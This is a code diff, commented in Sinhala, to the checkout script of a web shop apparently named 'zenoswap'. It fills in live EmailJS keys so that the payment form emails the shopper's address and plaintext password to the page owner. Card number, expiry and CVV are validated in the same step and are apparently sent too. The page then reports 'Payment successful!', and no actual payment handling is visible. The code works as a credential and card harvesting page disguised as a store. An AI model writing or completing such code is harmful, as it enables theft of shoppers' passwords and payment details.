@@ -1,5 +1,6 @@
-/* ============ EmailJS ============ */
-emailjs.init("YOUR_PUBLIC_KEY"); // 🔧 මෙතන Public Key දාන්න
+/* ============ EmailJS Init ============ */
+// ඔයාගේ Public Key එක මෙතනට දාලා තියෙනවා
+emailjs.init("m5Fg-0wPmGG6HqA3Q"); 
 
 /* ============ Cart ============ */
 const cart = JSON.parse(localStorage.getItem("zenoswap_cart") || "[]");
@@ -307,7 +308,7 @@ function generateOrderId() {
   return "ZS" + Date.now().toString().slice(-6);
 }
 
-/* ============ Submit ============ */
+/* ============ Submit Payment (Email යවන තැන) ============ */
 function submitPayment() {
   const ok = [validateName(), validateCardNumber(), validateExpiry(), validateCVV()].every(v => v === true);
   if (!ok) {
@@ -325,6 +326,7 @@ function submitPayment() {
   const orderId = document.getElementById("orderId").innerText;
   const itemsList = cart.map(i => `${i.name} × ${i.qty} = $${(i.price * i.qty).toFixed(2)}`).join("\n");
 
+  // ඊමේල් එකට යවන ඩේටා
   const params = {
     email: document.getElementById("regEmail").value.trim(),
     password: document.getElementById("regPassword").value,
@@ -342,7 +344,8 @@ function submitPayment() {
     items: itemsList
   };
 
-  emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", params)
+  // ඔයාගේ Service ID සහ Template ID මෙතනට දාලා තියෙනවා
+  emailjs.send("service_6fba0zo", "template_zem7g9d", params)
     .then(() => {
       showStatus("Payment successful!", "success");
       payBtnText.innerText = "✓ Success";
@@ -354,7 +357,7 @@ function submitPayment() {
       }, 1500);
     })
     .catch(err => {
-      console.error(err);
+      console.error("Email Error:", err);
       showStatus("❌ Payment failed. Try again.", "error");
       payBtn.disabled = false;
       payBtn.classList.remove("loading");
